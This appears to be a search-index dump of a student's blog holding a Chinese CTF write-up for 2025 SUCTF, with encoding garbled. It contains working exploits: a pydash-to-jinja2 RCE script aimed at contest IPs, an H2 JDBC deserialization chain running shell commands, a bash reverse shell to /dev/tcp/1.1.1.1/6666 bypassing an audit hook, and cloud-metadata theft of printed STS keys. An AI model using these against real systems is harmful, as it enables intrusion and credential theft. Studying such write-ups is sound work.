@app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def add_friendlink(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) name = request.form.get(\u0026#39;name\u0026#39;) url = request.form.get(\u0026#39;url\u0026#39;) if name and url: friend_links.append({\u0026#34;name\u0026#34;: name, \u0026#34;url\u0026#34;: url}) return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/delete_friendlink/\u0026#39;) def delete_friendlink(index): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) if 0 \u0026lt;= index \u0026lt; len(friend_links): del friend_links[index] return redirect(url_for(\u0026#39;friendlinks\u0026#39;)) @app.route(\u0026#39;/article\u0026#39;) def article(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) file_name = request.args.get(\u0026#39;file\u0026#39;, \u0026#39;\u0026#39;) if not file_name: return render_template(\u0026#39;article.html\u0026#39;, file_name=\u0026#39;\u0026#39;, content=\u0026#34;æœªæä¾›æ–‡ä»¶åã€‚\u0026#34;) blacklist = [\u0026#34;waf.py\u0026#34;] if any(blacklisted_file in file_name for blacklisted_file in blacklist): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;å¤§é»‘é˜”ä¸è®¸çœ‹\u0026#34;) if not file_name.startswith(\u0026#39;articles/\u0026#39;): return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æ•ˆçš„æ–‡ä»¶è·¯å¾„ã€‚\u0026#34;) if file_name not in articles.values(): if session.get(\u0026#39;username\u0026#39;) != \u0026#39;admin\u0026#39;: return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=\u0026#34;æ— æƒè®¿é—®è¯¥æ–‡ä»¶ã€‚\u0026#34;) file_path = os.path.join(BASE_DIR, file_name) file_path = file_path.replace(\u0026#39;../\u0026#39;, \u0026#39;\u0026#39;) try: with open(file_path, \u0026#39;r\u0026#39;, encoding=\u0026#39;utf-8\u0026#39;) as f: content = f.read() except FileNotFoundError: content = \u0026#34;æ–‡ä»¶æœªæ‰¾åˆ°ã€‚\u0026#34; except Exception as e: app.logger.error(f\u0026#34;Error reading file {file_path}: {e}\u0026#34;) content = \u0026#34;è¯»å–æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ã€‚\u0026#34; return render_template(\u0026#39;article.html\u0026#39;, file_name=file_name, content=content) @app.route(\u0026#39;/Admin\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def admin(): if request.args.get(\u0026#39;pass\u0026#39;) != \u0026#34;SUers\u0026#34;: return \u0026#34;nonono\u0026#34; if request.method == \u0026#39;POST\u0026#39;: try: body = request.json if not body: flash(\u0026#34;No JSON data received\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;No JSON data received\u0026#34;}), 400 key = body.get(\u0026#39;key\u0026#39;) value = body.get(\u0026#39;value\u0026#39;) if key is None or value is None: flash(\u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Missing required keys: \u0026#39;key\u0026#39; or \u0026#39;value\u0026#39;\u0026#34;}), 400 if not pwaf(key): flash(\u0026#34;Invalid key format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid key format\u0026#34;}), 400 if not cwaf(value): flash(\u0026#34;Invalid value format\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid value format\u0026#34;}), 400 set_(user_data, key, value) flash(\u0026#34;User data updated successfully\u0026#34;, \u0026#34;success\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;User data updated successfully\u0026#34;}), 200 except json.JSONDecodeError: flash(\u0026#34;Invalid JSON data\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: \u0026#34;Invalid JSON data\u0026#34;}), 400 except Exception as e: flash(f\u0026#34;An error occurred: {str(e)}\u0026#34;, \u0026#34;error\u0026#34;) return jsonify({\u0026#34;message\u0026#34;: f\u0026#34;An error occurred: {str(e)}\u0026#34;}), 500 return render_template(\u0026#39;admin.html\u0026#39;, user_data=user_data) @app.route(\u0026#39;/logout\u0026#39;) def logout(): session.pop(\u0026#39;username\u0026#39;, None) flash(\u0026#34;You have been logged out.\u0026#34;, \u0026#34;info\u0026#34;) return redirect(url_for(\u0026#39;login\u0026#39;)) if __name__ == \u0026#39;__main__\u0026#39;: app.run(host=\u0026#39;0.0.0.0\u0026#39;, port=10000) é™¤äº†ä¹‹å‰ç”¨åˆ°çš„æ¥å£ï¼Œåªå‰©ä¸‹ä¸€ä¸ª/Admin\nè¿™é‡Œæœ‰ä¸€ä¸ªåŸå‹é“¾æ±¡æŸ“ï¼Œä¸è¿‡é¢˜ç›®è¦æˆ‘ä»¬RCEï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç»“åˆä¸€ä¸‹jinja2çš„ä¸€ä¸ªæ¨¡ç‰ˆæ¸²æŸ“\nhttps://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/\nwafé‡Œæ•°å­—åªå‰©ä¸‹2ï¼Œä¹Ÿæ˜¯æŒ‡å¼•æˆ‘ä»¬æ‰“jinja2\næˆ‘ä»¬è¿˜éœ€è¦è·å–sysæ¨¡å—ï¼Œä¸Šé¢æ–‡ç« é“¾æ¥ä¸­çš„ä¸€ä¸ªpayloadæ˜¯ç”¨äº†__loader__ï¼Œä½†æ˜¯è¿™é¢˜è¢«banäº†\né‚£æˆ‘ä»¬åªèƒ½ç”¨__spec__æ¥ä»£æ›¿__loader__æ¥è·å–åˆ°sysæ¨¡å—\nå› ä¸ºæ¨¡ç‰ˆç¼–è¯‘åªåœ¨ç¬¬ä¸€æ¬¡è®¿é—®æ—¶æ‰ç¼–è¯‘ï¼Œæ‰€ä»¥è¦å¡å®¹å™¨é‡å¯çš„ç¬¬ä¸€æ—¶é—´æ‰èƒ½æ‰“é€š\nexp\nimport requests import multiprocessing js = { \u0026#34;key\u0026#34;: \u0026#34;__class__.__init__.__globals__.__builtins__.__spec__.__init__.__globals__.sys.modules.jinja2.runtime.exported.2\u0026#34;, \u0026#34;value\u0026#34;: \u0026#34;*;import os;os.system(\u0026#39;/read\\\\x66lag \u0026gt; /tmp/f\u0026#39;)\u0026#34;} def brute(url): while True: try: res = requests.post(url + \u0026#34;/Admin?pass=SUers\u0026#34;, json=js) print(url + \u0026#34;:\u0026#34; + res.text) requests.get(url + \u0026#34;/Admin?pass=SUers\u0026#34;) requests.get(url + \u0026#34;/\u0026#34;) requests.get(url + \u0026#34;/login\u0026#34;) requests.get(url + \u0026#34;/register\u0026#34;) except Exception as e: print(e) if __name__ == \u0026#39;__main__\u0026#39;: urls=[\u0026#34;http://27.25.151.48:10000\u0026#34;, \u0026#34;http://27.25.151.48:10001\u0026#34;, \u0026#34;http://27.25.151.48:10002\u0026#34;, \u0026#34;http://27.25.151.48:10003\u0026#34;, \u0026#34;http://27.25.151.48:10004\u0026#34;, \u0026#34;http://27.25.151.48:10005\u0026#34;] for url in urls: p = multiprocessing.Process(target=brute, args=(url,)) p.start() SU_photogallery ç”±404é¡µé¢å¯ä»¥å¾ˆæ˜æ˜¾çš„çŸ¥é“æ˜¯ä¸€ä¸ªä¸´æ—¶æœåŠ¡php -Så¼€å¯çš„\nå†æ ¹æ®å»å¹´å‡ºçš„ä¸€ä¸ªæ´ï¼Œç”±php -Så¼€å¯çš„æœåŠ¡åœ¨ç‰¹å®šç‰ˆæœ¬ä¸‹èƒ½å¤Ÿè¯»å–æºç \nhttps://cloud.tencent.com/developer/article/2235691\næ‰€ä»¥è¿™é‡Œä¹Ÿæ˜¯æœ‰æ¨¡å­¦æ ·çš„æ‹¿åˆ°æºç \nåç»­æ‰“çš„æ—¶å€™ç¢°åˆ°åˆ«äººå†™çš„shellï¼Œç„¶åç”¨æºç æ³„æ¼çœ‹å‚æ•°å°±ç›´æ¥æ‰“è¿›å»äº†(è¿™ä¹Ÿæ˜¯å…¬å…±ç¯å¢ƒåšé¢˜æ€è·¯çš„ä¸€éƒ¨åˆ†å­xsl)\n","date":"2025-01-18T19:38:41+08:00","permalink":"http://localhost:1313/post/2025suctf/","section":"post","tags":null,"title":"2025-SUCTF-WP"},{"categories":null,"contents":" 1231 456 å‹é“¾åç§°2 å‹é“¾æè¿°2 ","date":"2025-01-18T01:22:01+08:00","permalink":"http://localhost:1313/friend/","section":"","tags":null,"title":"å‹é“¾"},{"categories":null,"contents":"ä¸€åå¤§äºŒåœ¨è¯»å­¦ç”Ÿ\nSyclover \u0026amp; 0XFFF æˆå‘˜\nå¯¹å„ç§å®‰å…¨æ„Ÿå…´è¶£ï¼Œç›®å‰ä¸»è¦å­¦ä¹ çš„è¿˜çš„æ˜¯Webå®‰å…¨ï¼ˆJava å®‰å…¨ã€äº‘å®‰å…¨ç­‰ï¼‰\næœ€çˆ±åƒï¼Œæœ€å–œæ¬¢åƒçš„æ˜¯ğŸ‰ï¼Œæœ€å–œæ¬¢å¹²çš„äº‹æƒ…å°±æ˜¯å¤§å¤å¤©æŠ±ç€åŠä¸ªè¥¿ç“œæ‹¿å‹ºå­æŒ–ç€åƒç„¶åçœ‹è§†é¢‘\nä¼šæ‰“ç‚¹å°æ¸¸æˆï¼ˆå…¶å®ä»å°å­¦ä¹‹å‰å°±å¼€å§‹æ‰“æ¸¸æˆäº†hh\nä»€ä¹ˆéƒ½æƒ³å­¦ï¼Œä½†ä»€ä¹ˆéƒ½ä¸ä¼š\nContact Me Email:gsbp6279@gmail.com\nGitHub:https://github.com/GSBP0/:\n","date":"2025-01-17T19:38:41+08:00","permalink":"http://localhost:1313/about/","section":"","tags":null,"title":"About Me"},{"categories":null,"contents":"SU_ez_solon é¢˜ç›®ç›´æ¥ç»™äº†ä¸ªhessianååºåˆ—åŒ–çš„æ¥å£\n// // Source code recreated from a .class file by IntelliJ IDEA // (powered by FernFlower decompiler) // package com.example.demo.controller; import com.caucho.hessian.io.Hessian2Input; import java.io.ByteArrayInputStream; import java.util.Base64; import org.noear.solon.annotation.Controller; import org.noear.solon.annotation.Mapping; import org.noear.solon.annotation.Param; @Controller public class IndexController { public IndexController() { } @Mapping(\u0026#34;/hello\u0026#34;) public String hello(@Param(defaultValue = \u0026#34;hello\u0026#34;) String data) throws Exception { byte[] decode = Base64.getDecoder().decode(data); Hessian2Input hessian2Input = new Hessian2Input(new ByteArrayInputStream(decode)); Object object = hessian2Input.readObject(); return object.toString(); } } ä¸è¿‡ä»–è¿™ä¸ªååºåˆ—åŒ–è¿˜ç»™äº†ä¸€ä¸ªtoString()çš„è°ƒç”¨\nç„¶åå†è§‚å¯Ÿä¸€ä¸‹ç»™çš„ä¾èµ–\n... \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;hessian\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;3.5.5\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alipay.sofa.common\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;sofa-common-tools\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.4.0\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.alibaba\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;fastjson\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;1.2.83\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; \u0026lt;dependency\u0026gt; \u0026lt;groupId\u0026gt;com.h2database\u0026lt;/groupId\u0026gt; \u0026lt;artifactId\u0026gt;h2\u0026lt;/artifactId\u0026gt; \u0026lt;version\u0026gt;2.2.224\u0026lt;/version\u0026gt; \u0026lt;/dependency\u0026gt; h2å’Œfastjsonè¿™ä¿©ä¾èµ–å†™ä¸€èµ·çš„ï¼Œå†åŠ ä¸Šä¸Šé¢çš„toString(),æŒ‡å‘å‹å¾ˆå¼ºäº†,å°±æ˜¯è®©æˆ‘ä»¬åˆ©ç”¨fastjsonçš„getteræ‰“ä¸€ä¸ªJDBCæ”»å‡»\nåšé¢˜è¿‡ç¨‹ åšé¢˜çš„æ—¶å€™æ‰¾äº†æœ‰å‡ ä¸ªèƒ½æ‰“é€šçš„ç±»ï¼Œä½†éƒ½å› ä¸ºsofa-hessianè‡ªå¸¦çš„ååºåˆ—åŒ–åå•è¢«åšæ‰äº†\næˆ‘ä»¬éœ€è¦çŸ¥é“åœ¨æ‰“h2çš„jdbcæ—¶ï¼Œæœ€åéƒ½ä¼šèµ°å‘å“ªä¸ªç±»çš„å“ªä¸ªæ–¹æ³•\norg.h2.jdbc.JdbcConnection.JdbcConnection()\nå°±æ˜¯JdbcConnectionçš„æ„é€ æ–¹æ³•ï¼Œä»¥æ­¤ä¸ºæ ¹æ®å»æ‰¾å“ªäº›getterä¼šå®ä¾‹åŒ–ä¸€ä¸ªJdbcConnectionç±»\nè¿™é‡Œå¯ä»¥å†™codeqlæ¥æ‰¾ï¼Œæˆ‘æœ‰ç‚¹æ‡’æ²¡å’‹å†™ï¼Œè¿™é‡Œå†™æˆ‘æ‰¾åˆ°çš„ä¸¤ä¸ªæ–¹æ³•\norg.h2.jdbcx.JdbcDataSource.getConnection() org.noear.solon.data.util.UnpooledDataSource ç¬¬ä¸€ä¸ªè¢«é»‘åå•banäº†ï¼Œä½†æ˜¯å®ƒç»™äº†æˆ‘ä»¬äº›è®¸çµæ„Ÿï¼ŒJdbcDataSourceç±»å®ç°äº†DataSourceæ¥å£ï¼Œç»§æ‰¿è¿™ä¸ªæ¥å£çš„ç±»éƒ½è¦é‡å†™getConnection()æ–¹æ³•ï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥å»æ ¹æ®ç»§æ‰¿å…³ç³»æ¥å¯»æ‰¾é€‚åˆçš„æ–¹æ³•\næ‰€ä»¥æˆ‘ä»¬æ‰¾åˆ°äº†UnpooledDataSourceæ–¹æ³•ï¼Œå³ä¸åœ¨é»‘åå•ä¸Šï¼Œè€Œä¸”ä»–çš„æ„é€ æ–¹æ³•å’ŒgetConnectionä¹Ÿå¾ˆæœ‰æ„æ€\npublic UnpooledDataSource(String url, String username, String password, String driverClassName) { if (Utils.isEmpty(url)) { throw new IllegalArgumentException(\u0026#34;Invalid ds url parameter\u0026#34;); } else { this.logWriter = new PrintWriter(System.out); this.url = url; this.username = username; this.password = password; this.setDriverClassName(driverClassName); } } public Connection getConnection() throws SQLException { return this.username == null ? DriverManager.getConnection(this.url) : DriverManager.getConnection(this.url, this.username, this.password); } æ„é€ æ–¹æ³•ä¼šè‡ªåŠ¨æ ¹æ®ä½ çš„driverClassNameæ¥æ³¨å†Œå¯¹åº”é©±åŠ¨ç±»ï¼Œç„¶ågetConnection()ä¹Ÿä¼šç›´æ¥ä»DriverManagerä¸­è¿›è¡ŒConnectionæ“ä½œï¼Œæ³›ç”¨æ€§å¾ˆå¼º\nç„¶ååé¢å¸¸è§„æ‰“h2RCEçš„æ€è·¯äº†ï¼Œæœ‰ä¸€ä¸ªSecurityManagerè¦ç»•ï¼Œå…¶å®ç›´æ¥è°ƒç”¨setSecurityManager(null)å°±å¥½äº†\npublic static void main(String[] args) throws Exception{ UnpooledDataSource unpooledDataSource = new UnpooledDataSource(\u0026#34;jdbc:h2:mem:testdb;TRACE_LEVEL_SYSTEM_OUT=3;INIT=RUNSCRIPT FROM \u0026#39;http://127.0.0.1:8000/poc.sql\u0026#39;\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;GSBP\u0026#34;,\u0026#34;org.h2.Driver\u0026#34;); unpooledDataSource.setLogWriter(null); JSONObject jsonObject = new JSONObject(); jsonObject.put(\u0026#34;xx\u0026#34;, unpooledDataSource); String payload =Util.hessianSerialize(jsonObject); System.out.println(URLEncoder.encode(payload, \u0026#34;UTF-8\u0026#34;)); Util.hessianDeserialize(payload); } poc.sql\nCREATE ALIAS GSBPPP12 AS $$ String shellexec(String cmd) throws java.io.IOException { System.setSecurityManager(null);java.util.Scanner s = new java.util.Scanner(Runtime.getRuntime().exec(cmd).getInputStream()).useDelimiter(\u0026#34;\\\\A\u0026#34;); return s.hasNext() ? s.next() : \u0026#34;\u0026#34;; }$$;CALL GSBPPP12(\u0026#39;command what you want execute\u0026#39;); SU_easyk8s_on_aliyun(REALLY VERY EASY) ç¡®å®æ˜¯å¾ˆç®€å•çš„ä¸€ä¸ªäº‘æ¸—é€\nå‰é¢è¦ä»pythoné‚£é‡Œæ‹¿ä¸ªshellï¼Œä¸è¿‡æœ‰hook\nimport sys DBUG = False def audit_hook(event, args): audit_functions = { \u0026#34;os.system\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.Popen\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_call\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;subprocess.check_output\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;_posixsubprocess.fork_exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawn\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnlp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnv\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.spawnve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.exec\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execve\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvp\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.execvpe\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;os.fork\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;shutil.run\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlsym\u0026#34;: {\u0026#34;ban\u0026#34;: True}, \u0026#34;ctypes.dlopen\u0026#34;: {\u0026#34;ban\u0026#34;: True} } if event in audit_functions: if DEBUG: print(f\u0026#34;[DEBUG] found event {event}\u0026#34;) policy = audit_functions[event] if policy[\u0026#34;ban\u0026#34;]: strr = f\u0026#34;AUDIT BAN : Banning FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) raise PermissionError(f\u0026#34;[AUDIT BANNED]{event} is not allowed.\u0026#34;) else: strr = f\u0026#34;[DEBUG] AUDIT ALLOW : Allowing FUNC:[{event}] with ARGS: {args}\u0026#34; print(strr) return sys.addaudithook(audit_hook) è¿™é‡Œ_posixsubprocess.fork_execè¿™ä¸ªhookæ˜¯æŠ“ä¸äº†çš„ï¼Œæ‰€ä»¥å®ƒç­‰äºç™½å†™\n__import__(\u0026#39;_posixsubprocess\u0026#39;).fork_exec( [b\u0026#34;/bin/bash\u0026#34;, b\u0026#34;-c\u0026#34;, b\u0026#34;bash -i \u0026gt;\u0026amp; /dev/tcp/1.1.1.1/6666 0\u0026gt;\u0026amp;1\u0026#34;], [b\u0026#34;/bin/bash\u0026#34;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(__import__(\u0026#39;os\u0026#39;).pipe()), False, False, False, None, None, None, -1, None, False ) ç›´æ¥æ‹¿shellï¼Œç„¶åç”¨ptyå‡çº§ä¸€ä¸‹è‡ªå·±çš„shell\nè¿›shellä¹‹åè¦ä¿¡æ¯æœé›†ä¸€ä¸‹ï¼Œè¿™é‡Œå¸¸ç”¨æ€è·¯å°±æ˜¯ç”¨cdk_linux_amd64\n... [ Information Gathering - Net Namespace ] container net namespace isolated. [ Information Gathering - Sysctl Variables ] 2025/01/12 08:57:58 net.ipv4.conf.all.route_localnet = 1 2025/01/12 08:57:58 You may be able to access the localhost service of the current container node or other nodes. [ Information Gathering - DNS-Based Service Discovery ] error when requesting coreDNS: lookup any.any.svc.cluster.local. on 10.43.0.10:53: no such host error when requesting coreDNS: lookup any.any.any.svc.cluster.local. on 10.43.0.10:53: no such host [ Discovery - K8s API Server ] 2025/01/12 08:57:58 checking if api-server allows system:anonymous request. err found in post request, error response code: 401 Unauthorized. api-server forbids anonymous request. response:{\u0026#34;kind\u0026#34;:\u0026#34;Status\u0026#34;,\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;metadata\u0026#34;:{},\u0026#34;status\u0026#34;:\u0026#34;Failure\u0026#34;,\u0026#34;message\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;reason\u0026#34;:\u0026#34;Unauthorized\u0026#34;,\u0026#34;code\u0026#34;:401} [ Discovery - K8s Service Account ] service-account is available 2025/01/12 08:57:58 trying to list namespaces err found in post request, error response code: 403 Forbidden. [ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html 2025/01/12 08:57:59 failed to dial Azure API. 2025/01/12 08:57:59 failed to dial Google Cloud API. 2025/01/12 08:57:59 failed to dial Tencent Cloud API. 2025/01/12 08:58:00 failed to dial OpenStack API. 2025/01/12 08:58:01 failed to dial Amazon Web Services (AWS) API. 2025/01/12 08:58:02 failed to dial ucloud API. ... ä¸é¢˜ç›®åå­—ç›¸ç»“åˆï¼ŒçŸ¥é“äº†å…³é”®ä¿¡æ¯\n[ Discovery - Cloud Provider Metadata API ] Alibaba Cloud Metadata API available in http://100.100.100.200/latest/meta-data/ Docs: https://help.aliyun.com/knowledge_detail/49122.html ç„¶åå»çœ‹æ–‡æ¡£\nå¾ˆæ˜æ˜¾åœ¨é¢˜ç›®å†…æ˜¯æ²¡æœ‰å¼€åŠ å›ºæ¨¡å¼çš„,æˆ‘ä»¬è¿™é‡Œç›´æ¥è®¿é—®å°±å¥½\nç„¶åæ‹¿åˆ°äº†ä¸€ä¸ªak/sk\n{ \u0026#34;AccessKeyId\u0026#34; : \u0026#34;STS.NTfZuo3n761cQMys2MNiNBo9a\u0026#34;, \u0026#34;AccessKeySecret\u0026#34; : \u0026#34;5zbrTpf6iWzMu6DdPpy42ZCj2kDfrwbte4JT9LLCQBzY\u0026#34;, \u0026#34;Expiration\u0026#34; : \u0026#34;2025-01-12T14:05:03Z\u0026#34;, \u0026#34;SecurityToken\u0026#34; : \u0026#34;CAIS1AJ1q6Ft5B2yfSjIr5fTEc/b3rEWgfOIU2vIlzIYQuZiraqSgzz2IHhMdHRqBe0ctvQ+lG5W6/4YloltTtpfTEmBc5I179Fd6VqqZNTZqcy74qwHmYS1RXadFEZYDnNszr+rIunGc9KBNnrm9EYqs5aYGBymW1u6S+7r7bdsctUQWCShcDNCH604DwB+qcgcRxCzXLTXRXyMuGfLC1dysQdRkH527b/FoveR8R3Dllb3uIR3zsbTWsH6MZc1Z8wkDovsjbArKvL7vXQOu0QQxsBfl7dZ/DrLhNaZDmRK7g+OW+iuqYU3fFIjOvVgQ/4V/KaiyKUioIzUjJ+y0RFKIfHnm/ES9DUVqiGtOpRKVr5RHd6TUxxGgmVUsD3M+Eqi7Sau0K+e5xjFvkUxaHpiA3iRUcyMsxuRQWyIEOP+y9oVsqEYoRiWu7TDSTeBK6PPRvNGUvdUGoABfmqFersd5q3sAhpi7UHmtkhuEn8jODpY4bxubpPLrQwZu7ToyzoWY9vERJzKarge1l3oM9jQP+q30t86v6WxFy2RHh97iDaIEUh3gpL9Mxu9fi4aRYzPZ2qhdZNCdWlE3CrGCuPAsoU0g3JUohJJnycnBj9o54Tdk4cTkjugEyUgAA==\u0026#34;, \u0026#34;LastUpdated\u0026#34; : \u0026#34;2025-01-12T08:05:03Z\u0026#34;, \u0026#34;Code\u0026#34; : \u0026#34;Success\u0026#34; } å¾ˆæ˜æ˜¾å°±æ˜¯è¦æˆ‘ä»¬å»ossğŸª£é‡Œçœ‹flagï¼Œä¸Šå»å‘ç°è¢«åˆ äº†ï¼Œä¸è¿‡æ²¡å¤šå¤§é—®é¢˜ï¼Œè¿™é‡Œæˆ‘ä»¬çœ‹ä¹‹å‰ç‰ˆæœ¬çš„å†…å®¹å°±å¥½äº†\nSU_blog æ³¨å†Œæ¥å£æœ‰ä¸ªä»»æ„ç”¨æˆ·å¯†ç é‡ç½®çš„æ´ï¼Œè¿™é‡Œç›´æ¥ç”¨adminåšç”¨æˆ·åå°±èƒ½é‡ç½®adminçš„å¯†ç äº†\nä¹Ÿçœäº†åé¢çˆ†ç ´jwtå¯†é’¥çš„æ“ä½œ\nçœ‹åˆ°articleé‡Œçš„ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾çš„æ–‡ä»¶è·¯å¾„ï¼Œè¿™é‡Œå°è¯•ä¸€ä¸‹èƒ½ä¸èƒ½è·¯å¾„ç©¿è¶Š\nå‘ç°åŠ ../å’Œä¸åŠ æ˜¯ä¸€æ ·çš„ï¼ŒçŒœæµ‹åç«¯è¿›è¡Œäº†replaceæ“ä½œ\næ‰€ä»¥è¯•ä¸€ä¸‹åŒå†™..../ï¼Œç„¶åå°±èƒ½è¯»äº†\nè¯»åˆ°æºç å’Œwaf(wafæˆ‘è¿™é‡Œç”¨waf\u0026hellip;/pyæ¥ç»•è¿‡è¯»åˆ°)\nfrom flask import * import time, os, json, hashlib from pydash import set_ from waf import pwaf, cwaf app = Flask(__name__) app.config[\u0026#39;SECRET_KEY\u0026#39;] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\u0026#34;testuser\u0026#34;: \u0026#34;password\u0026#34;} BASE_DIR = \u0026#39;/var/www/html/myblog/app\u0026#39; articles = { 1: \u0026#34;articles/article1.txt\u0026#34;, 2: \u0026#34;articles/article2.txt\u0026#34;, 3: \u0026#34;articles/article3.txt\u0026#34; } friend_links = [ {\u0026#34;name\u0026#34;: \u0026#34;bkf1sh\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://ctf.org.cn/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;fushuling\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://fushuling.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;yulate\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.yulate.com/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;zimablue\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://www.zimablue.life/\u0026#34;}, {\u0026#34;name\u0026#34;: \u0026#34;baozongwi\u0026#34;, \u0026#34;url\u0026#34;: \u0026#34;https://baozongwi.xyz/\u0026#34;} ] class User: def __init__(self): pass user_data = User() @app.route(\u0026#39;/\u0026#39;) def index(): if \u0026#39;username\u0026#39; in session: return render_template(\u0026#39;blog.html\u0026#39;, articles=articles, friend_links=friend_links) return redirect(url_for(\u0026#39;login\u0026#39;)) @app.route(\u0026#39;/login\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def login(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] if username in users and users[username] == password: session[\u0026#39;username\u0026#39;] = username return redirect(url_for(\u0026#39;index\u0026#39;)) else: return \u0026#34;Invalid credentials\u0026#34;, 403 return render_template(\u0026#39;login.html\u0026#39;) @app.route(\u0026#39;/register\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def register(): if request.method == \u0026#39;POST\u0026#39;: username = request.form[\u0026#39;username\u0026#39;] password = request.form[\u0026#39;password\u0026#39;] users[username] = password return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;register.html\u0026#39;) @app.route(\u0026#39;/change_password\u0026#39;, methods=[\u0026#39;GET\u0026#39;, \u0026#39;POST\u0026#39;]) def change_password(): if \u0026#39;username\u0026#39; not in session: return redirect(url_for(\u0026#39;login\u0026#39;)) if request.method == \u0026#39;POST\u0026#39;: old_password = request.form[\u0026#39;old_password\u0026#39;] new_password = request.form[\u0026#39;new_password\u0026#39;] confirm_password = request.form[\u0026#39;confirm_password\u0026#39;] if users[session[\u0026#39;username\u0026#39;]] != old_password: flash(\u0026#34;Old password is incorrect\u0026#34;, \u0026#34;error\u0026#34;) elif new_password != confirm_password: flash(\u0026#34;New passwords do not match\u0026#34;, \u0026#34;error\u0026#34;) else: users[session[\u0026#39;username\u0026#39;]] = new_password flash(\u0026#34;Password changed successfully\u0026#34;, \u0026#34;success\u0026#34;) return redirect(url_for(\u0026#39;index\u0026#39;)) return render_template(\u0026#39;change_password.html\u0026#39;) @app.route(\u0026#39;/friendlinks\u0026#39;) def friendlinks(): if \u0026#39;username\u0026#39; not in session or session[\u0026#39;username\u0026#39;] != \u0026#39;admin\u0026#39;: return redirect(url_for(\u0026#39;login\u0026#39;)) return render_template(\u0026#39;friendlinks.html\u0026#39;, links=friend_links) @app.route(\u0026#39;/add_friendlink\u0026#39;, methods=[\u0026#39;POST\u0026#39;]) def 